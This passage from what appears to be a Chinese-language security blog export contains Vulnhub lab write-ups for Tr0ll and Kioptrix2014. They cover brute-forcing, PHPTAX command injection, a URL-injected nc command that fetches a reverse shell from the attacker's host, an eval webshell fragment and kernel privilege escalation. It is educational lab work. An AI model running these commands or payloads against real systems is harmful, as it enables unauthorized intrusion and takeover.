<p>这个数据包是某个用户的操作（12为客户端，06为服务端）：</p>
<p>匿名登录–&gt;查看系统类型–&gt;请求服务器主动连接本地端口–&gt;查看目录内容–&gt;切换到二进制模式–&gt;请求服务器主动连接本地端口–&gt;上传secret_stuff.txt文件–&gt;切换到ASCII模式–&gt;再次查看目录内容–&gt;退出登录</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/6.png" alt></p>
<p>进一步寻找，我们过滤<code>ftp-data</code>协议，找到如下内容</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/7.png" alt></p>
<p>推测：</p>
<ol>
<li>ftp内存在隐藏文件：sup3rs3cr3tdirlol</li>
<li>某个用户名or密码：sup3rs3cr3tdirlol（or 都可能去掉某些字符）</li>
<li>网站存在隐藏路径：sup3rs3cr3tdirlol</li>
</ol>
<ul>
<li>使用FileZilla Client强制显示隐藏文件，没有效果，这种应该也只是显示点开头隐藏文件。<ul>
<li>可能我们当前的匿名用户权限不够，需要提升权限：提升权限无果</li>
</ul>
</li>
<li>使用用户名/密码登录失败</li>
<li>访问网站隐藏路径（毕竟扫不出来这种复杂路径），bingo！</li>
</ul>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/8.png" alt></p>
<p>把<code>rolmao</code>下载下来，文本形式打开，发现头部有ELF（Executable and Link Format 可执行可连接模式文件），遂放到Kali内执行</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/9.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Find address 0x0856BF to proceed # 兔子洞</span><br></pre></td></tr></table></figure>

<ul>
<li>看了下这个文件有72KB，挺大的，想跟着这个思路走可是我还不会二进制分析😭</li>
</ul>
<p>于是延续之前的思路，当成路径访问一下</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/10.png" alt></p>
<p>查看密码和用户名，保存下来用于爆破</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/11.png" alt></p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/12.png" alt></p>
<p>使用hydra和medusa均可，然而并没有一个成功😂，到这里作者已经给我安排了3个小trick，按照这个作者的骚思路，再来一个也有可能，这个或许就是，名字文件我把删掉的注解复原，再进行爆破，失败。</p>
<p>再回头看看，密码文件是<code>Good_job_:)</code>，感觉并不是一个密码，反而像一句单纯的鼓励，那岂不是没有密码？那么密码在哪？用户名可能是密码，两个文件名长度不一，密码文件名比较短，有没有可能就是文件名为密码？把上述想法记入<code>Pass.txt</code>再次爆破。</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/13.png" alt></p>
<p>糟糕，爆破这一块似乎作者做了些限制，一直断连，一次次尝试之后终于</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/14.png" alt></p>
<p>我们立马用ssh登录一下</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/15.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> uname -a</span></span><br><span class="line">Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux</span><br><span class="line"><span class="meta">$</span><span class="bash"> cat etc/issue</span></span><br><span class="line">Ubuntu 14.04.1 LTS \n \l</span><br></pre></td></tr></table></figure>

<p>骚作者还给我设定了登录时间</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/16.png" alt></p>
<h2 id="0x03-提权-amp-GetFlag"><a href="#0x03-提权-amp-GetFlag" class="headerlink" title="0x03 提权&amp;GetFlag"></a>0x03 提权&amp;GetFlag</h2><p>用刚才的版本信息搜一下系统漏洞，看好前两个</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/17.png" alt></p>
<p>老办法，用nc传输</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/18.png" alt></p>
<p>靶机接收，编译，运行</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/19.png" alt></p>
<p>成功提权！拿到<code>proof.txt</code></p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/20.png" alt></p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ul>
<li>靶机trick偏多，不过也是学到了思路的拐弯方式，有些开发or运维有可能使用这种小把戏，不太好想，能做到方式就是把自己所有想法全部记录下来（无论多疯狂or沙雕），能爆破则爆破，否则手工。</li>
<li>要多搜集，多总结</li>
</ul>
<h2 id="0x05-参考资源"><a href="#0x05-参考资源" class="headerlink" title="0x05 参考资源"></a>0x05 参考资源</h2><p><a href="https://www.offensive-security.com/offsec/what-it-means-to-try-harder/" target="_blank" rel="noopener">try harder</a></p>
<p><a href="https://klionsec.github.io/2017/12/09/vsftp-secfig/" target="_blank" rel="noopener">简述FTP入侵与防御</a></p>
<p><a href="https://shahmeeramir.com/penetration-testing-of-an-ftp-server-19afe538be4b" target="_blank" rel="noopener">penetration testing of a ftp server</a></p>
<p><a href="http://www.hxstrive.com/article/350.htm" target="_blank" rel="noopener">FTP命令学习笔记</a></p>
<p><a href="https://blog.csdn.net/crazw/article/details/8511352" target="_blank" rel="noopener">Linux下FTP操作命令详解</a></p>
<p><a href="https://blog.csdn.net/magicbreaker/article/details/1464339" target="_blank" rel="noopener">关于FTP的PORT命令</a></p>
<p><a href="https://blog.csdn.net/loonghun/article/details/14005865" target="_blank" rel="noopener">FTP命令模式下PASV OR PORT</a></p>
<p><a href="https://www.rubyguides.com/2012/01/four-ways-to-extract-files-from-pcaps/" target="_blank" rel="noopener">Four ways to extract files from pcap</a></p>
]]></content>
      <categories>
        <category>打靶</category>
        <category>pentest training</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub Kioptrix2014 Writeup</title>
    <url>/2020/03/10/Vulnhub-Kioptrix2014-Writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>Talk is cheap, show me writeup</strong></p>
<blockquote>
<p><strong>用到的工具和知识</strong></p>
<p>nmap、dirb、nikto、google、searchsploit、LFI、BurpSuite、netcat</p>
</blockquote>
<p><a href="https://download.vulnhub.com/kioptrix/kiop2014.tar.bz2" target="_blank" rel="noopener">靶机下载</a></p>
<a id="more"></a>

<h2 id="0x00-前置问题解决"><a href="#0x00-前置问题解决" class="headerlink" title="0x00 前置问题解决"></a>0x00 前置问题解决</h2><ul>
<li>靶机启动之后，nmap扫不到靶机ip，即使重启更换NAT模式也无效？<ul>
<li>将虚拟机配置中网络适配器移除，再次安装，设定为NAT或者桥接即可</li>
<li><a href="https://medium.com/@yashanand155/kioptrix-2014-networking-8440017ea795" target="_blank" rel="noopener">blog</a></li>
</ul>
</li>
</ul>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/1.png" alt></p>
<h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><p>nmap查找基本信息</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/2.png" alt></p>
<p>80和8080端口开启</p>
<p>访问80端口</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/3.png" alt></p>
<p>8080端口</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/4.png" alt></p>
<p>8080端口暂时没有权限访问</p>
<p>用工具继续收集信息</p>
<p>我们用目录遍历工具dirb、nikto、whatweb</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> dirb commen.txt扫描结果：</span></span><br><span class="line">80</span><br><span class="line">+ http://192.168.206.141:80/cgi-bin/ (CODE:403|SIZE:210)</span><br><span class="line">+ http://192.168.206.141:80/index.html (CODE:200|SIZE:152)</span><br><span class="line"></span><br><span class="line">8080</span><br><span class="line">+ http://192.168.206.141:8080/cgi-bin/ (CODE:403|SIZE:210)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> whatweb扫描结果：</span></span><br><span class="line">80 </span><br><span class="line"><span class="meta">#</span><span class="bash"> http://192.168.206.141:80 </span></span><br><span class="line">[200 OK] Apache[2.2.21][mod_ssl/2.2.21], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8], IP[192.168.206.141], Meta-Refresh-Redirect[pChart2.1.3/index.php], OpenSSL[0.9.8q], PHP[5.3.8], WebDAV[2]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> http://192.168.206.141/pChart2.1.3/index.php </span></span><br><span class="line">[302 Found] Apache[2.2.21][mod_ssl/2.2.21], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8], IP[192.168.206.141], OpenSSL[0.9.8q], PHP[5.3.8], RedirectLocation[examples/index.php], WebDAV[2], X-Powered-By[PHP/5.3.8]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> http://192.168.206.141/pChart2.1.3/examples/index.php </span></span><br><span class="line">[200 OK] Apache[2.2.21][mod_ssl/2.2.21], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8], IP[192.168.206.141], OpenSSL[0.9.8q], PHP[5.3.8], Script, Title[pChart 2.x - examples rendering], WebDAV[2], X-Powered-By[PHP/5.3.8]</span><br><span class="line"></span><br><span class="line">8080</span><br><span class="line"><span class="meta">#</span><span class="bash"> http://192.168.206.141:8080 </span></span><br><span class="line">[403 Forbidden] Apache[2.2.21][mod_ssl/2.2.21], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8], IP[192.168.206.141], OpenSSL[0.9.8q], PHP[5.3.8], Title[403 Forbidden], WebDAV[2]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> nikto扫描结果：</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.206.141</span><br><span class="line">+ Target Hostname:    192.168.206.141</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-03-10 14:34:38 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8</span><br><span class="line">+ Server leaks inodes via ETags, header found with file /, inode: 67014, size: 152, mtime: Sun Mar 30 01:22:52 2014</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ PHP/5.3.8 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.</span><br><span class="line">+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.</span><br><span class="line">+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE</span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.</span><br><span class="line">+ 8345 requests: 0 error(s) and 11 item(s) reported on remote host</span><br><span class="line">+ End Time:   2020-03-10 14:35:54 (GMT8) (76 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>

<p>发现whatweb扫描80端口出来一个<code>http://192.168.206.141/pChart2.1.3/index.php</code>，访问一下试试</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/5.png" alt></p>
<p>发现是个图表生成页面（PHP做的），这应该就是靶机入口了，进一步侦查，可以点击相应按钮阅读代码，发现都是先将PHP包含进来</p>
<p>访问<code>http://192.168.206.141/pChart2.1.3/class/</code>，出现如下页面</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/6.png" alt></p>
<p>既然已经出现了一个路径，可以想到能访问的不止这一个路径，于是在其基础上继续用dirb、nikto扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dirb http://192.168.206.141/pChart2.1.3/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> dirb扫描结果：</span></span><br><span class="line">START_TIME: Tue Mar 10 14:59:28 2020</span><br><span class="line">URL_BASE: http://192.168.206.141/pChart2.1.3/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.206.141/pChart2.1.3/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/cache/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/class/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/data/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/examples/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/fonts/</span><br><span class="line">+ http://192.168.206.141/pChart2.1.3/index.php (CODE:302|SIZE:0)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/cache/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/class/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/data/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/examples/ ----</span><br><span class="line">+ http://192.168.206.141/pChart2.1.3/examples/index.php (CODE:200|SIZE:86764)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/examples/pictures/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/examples/resources/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/examples/sandbox/</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/fonts/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/examples/pictures/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/examples/resources/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/examples/sandbox/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/examples/sandbox/includes/</span><br><span class="line">+ http://192.168.206.141/pChart2.1.3/examples/sandbox/index.php (CODE:200|SIZE:45314)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/examples/sandbox/script/</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/examples/sandbox/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/examples/sandbox/script/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Mar 10 15:01:35 2020</span><br><span class="line">DOWNLOADED: 13836 - FOUND: 3</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> nikto扫描结果：</span></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.206.141</span><br><span class="line">+ Target Hostname:    192.168.206.141</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-03-10 14:59:15 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8</span><br><span class="line">+ Retrieved x-powered-by header: PHP/5.3.8</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ Root page / redirects to: examples/index.php</span><br><span class="line">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span><br><span class="line">+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.</span><br><span class="line">+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)</span><br><span class="line">+ PHP/5.3.8 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE</span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.</span><br><span class="line">+ OSVDB-12184: /pChart2.1.3/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /pChart2.1.3/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /pChart2.1.3/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /pChart2.1.3/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3268: /pChart2.1.3/data/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /pChart2.1.3/data/: This might be interesting...</span><br><span class="line">+ Server leaks inodes via ETags, header found with file /pChart2.1.3/readme.txt, inode: 505755, size: 12220, mtime: Fri Sep  9 16:48:27 2011</span><br><span class="line">+ OSVDB-3092: /pChart2.1.3/readme.txt: This might be interesting...</span><br><span class="line">+ 7536 requests: 0 error(s) and 19 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-03-10 15:00:45 (GMT8) (90 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>

<p>可以看见nikto扫描结果中出现了如<code>/pChart2.1.3/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000</code>这样的链接，我们访问试试，有些是图片，还有一个是所谓的phpinfo</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/7.png" alt></p>
<p>这个PHP Credit只有模块名和作者名，其他什么都没有。这里我想是不是phpinfo这一块有盲区，于是Google一番，没有什么实际效果。（第一个兔子洞）</p>
<p>思路卡壳，遂上网借鉴walkthrough</p>
<ul>
<li>发现搜索思维和Google技术还是不到家，没转过弯来。我既然对某些部分一无所知，那么这些部分存在的漏洞也就被略过了</li>
<li>其实可以多问问自己这个图表模块（PHP编写）懂吗？会不会是通用的模块？是否存在漏洞？</li>
</ul>
<h2 id="0x02-漏洞挖掘与利用"><a href="#0x02-漏洞挖掘与利用" class="headerlink" title="0x02 漏洞挖掘与利用"></a>0x02 漏洞挖掘与利用</h2><p>按照这个思路，我继续Google</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/8.png" alt></p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/9.png" alt></p>
<p>这里也可以直接在kali上用searchsploit，不过可能性会比Google小，所以要抱有一种乐观的冷静</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/10.png" alt></p>
<p>测试这两个poc，可以运行，但是我又陷入了不知道该做什么的境地，原因还是对于这个环境不了解，不知道那些信息对于渗透比较重要，于是根据上面的想法提炼关键词：<strong>apache 敏感信息</strong>、<strong>apache 2.2.21 敏感信息</strong>、<strong>PHP 5.3.8敏感信息</strong>、 <strong>Apache默认路径</strong></p>
<p>找到如下两个有用信息：</p>
<p><a href="https://blog.csdn.net/bujidexinq/article/details/27187761" target="_blank" rel="noopener">各种OS的Apache默认路径</a></p>
<p><a href="https://daolgts.github.io/2019/03/08/%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%90%9C%E9%9B%86/" target="_blank" rel="noopener">敏感信息搜集</a></p>
<p>还是一番执行过程中看不到希望的测试（因为效率低，所以要<strong>编写脚本</strong>or<strong>搜集更多有效信息</strong>），终于发现一个有效敏感配置信息</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/11.png" alt></p>
<p>篇幅不长，仔细阅读非注释信息后，发现8080端口不能访问是因为设置了只允许浏览器为Mozilla4通过</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/12.png" alt></p>
<p>好，到这一步我想到修改UA，那就使用BP，将Mozilla 5.0修改为4.0后，8080页面即可见</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/13.png" alt></p>
<p>可是我后续要一直访问这个端口，每次手动改不现实，那么就用<code>Match and Replace</code>实现修改通过bp的每个数据包</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/14.png" alt></p>
<p>ok，点击index，成功进入下一步，是个PHPTAX，有了经验，继续用之前总结的方法论，上Google &amp; searchsploit</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/15.png" alt></p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/16.png" alt></p>
<p>找到相应漏洞版本，exploit</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/17.png" alt></p>
<p>复制粘贴保存txt内的PHP exp，按照参数执行</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/18.png" alt></p>
<p>报错，说没有<code>curl_init()</code>，Google如何开启</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/19.png" alt></p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/20.png" alt></p>
<p>修改<code>php.ini</code>内<code>;extension=curl</code>去掉前面的<code>;</code>注释，再次运行如上图，查找后并没有curl的动态链接库（Linux下为so，Windows为dll）</p>
<p>大概2个小时的调试安装（因为我用的2018版kali，😭），终于见到下面这张图</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/22.png" alt></p>
<p>unsuccessful！那么我换个exp，用<code>/usr/share/exploitdb/exploits/php/webapps/21665.txt</code></p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/21.png" alt></p>
<p>持续失败，休息了一会，决定阅读一下刚才的exp源码，把url复制粘贴到浏览器，访问成功</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/23.png" alt></p>
<p>尝试下一步的时候，却说不存在rce.php，传shell不成，难不成真要使用msf？不存在的，<code>/phptax/</code>继续目录爆破</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/24.png" alt></p>
<p>挨个路径访问，发现<code>phptax/data/</code>路径中我们的php shell的确已经写入，但是执行不了，同时发现<code>phptax/data/pdf</code>路径也有料</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/25.png" alt></p>
<p>再次借鉴walkthrough！</p>
<p>发现有些前辈可以执行命令，有些却并不能成功，同时他们也发现靶机上没有bash，没有python，有sh，可是用url直接访问依然不能工作，测试telnet也失败。（当然msf还是一波带走）</p>
<p>他们成功的方法：</p>
<ul>
<li>perl （用perl反弹shell）</li>
</ul>
<ul>
<li>想要写入webshell的话，必须在<code>$</code>前添加<code>\</code>转义，比如`echo @eval(\$_POST[‘psw’]);</li>
</ul>
<p>我参考第二种方法</p>
<p>可以直接查询信息，但也不能直接连接（nc秒断）</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/26.png" alt></p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/27.png" alt></p>
<p>那么试试nc传送（也可以用ftp）php-reverse-shell.php，我们在<code>/usr/share/webshell/php/</code>中找，改好ip和端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kali 发送</span></span><br><span class="line">nc -lvp 4444 &lt; php-reverse-shell.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> url 靶机接收</span></span><br><span class="line">192.168.206.141:8080/phptax/ips.php?m=nc%20192.168.206.140%201234%20%3E%20php-reverse-shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/29.png" alt></p>
<p>接收成功！我们在kali上监听，浏览器中访问shell.php</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/30.png" alt></p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/31.png" alt></p>
<h2 id="0x03-提权-amp-GetFlag"><a href="#0x03-提权-amp-GetFlag" class="headerlink" title="0x03 提权&amp;GetFlag"></a>0x03 提权&amp;GetFlag</h2><p>提权就很简单了，直接以OS版本FreeBSD为关键词搜索exp</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/35.png" alt></p>
<p>我们下到<code>/tmp</code>目录，直接用nc将exp传入靶机，gcc编译运行即提权</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/32.png" alt></p>
<p>在<code>/root</code>下找到congrats.txt</p>
<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/33.png" alt></p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ul>
<li>不断思考自己有什么信息，信息的作用范围，对这一块有没有了解过，是否会存在漏洞，提炼关键词Google</li>
<li>对于不同的经典漏洞，肯定会衍生处各种附属品，要想不断熟练并深挖这些漏洞，除了要了解深刻原理以外还要不断主动积累经验<ul>
<li>比如复现不同场景的利用方式，利用资料</li>
<li>再打个比方：在打比赛或者测试时，会遇到任意文件读取或者目录穿越之类的漏洞，可以读取一些敏感文件来更进一步，所以这种东西并不是没有目的去搜集，正是因为有漏洞配合才是我们去学习、去搜集的初衷</li>
</ul>
</li>
</ul>
<h2 id="0x05-参考资源"><a href="#0x05-参考资源" class="headerlink" title="0x05 参考资源"></a>0x05 参考资源</h2><p><a href="https://medium.com/bugbountywriteup/kioptrix-2014-c5b1f5144fc9" target="_blank" rel="noopener">Kioptrix 2014</a></p>
<p><a href="http://wg135.github.io/blog/2016/07/07/kioptrix2014-number-5/" target="_blank" rel="noopener">Kioptrix2014 (#5)</a></p>
<p><a href="https://nandtech.co/2017/07/20/penetration-testing-practice-hacking-kioptrix-2014/" target="_blank" rel="noopener">Hacking Kioptrix 2014</a></p>
]]></content>
      <categories>
        <category>打靶</category>
        <category>pentest training</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub Lampiao writeup</title>
    <url>/2020/03/07/Vulnhub-Lampiao-writeup/</url>
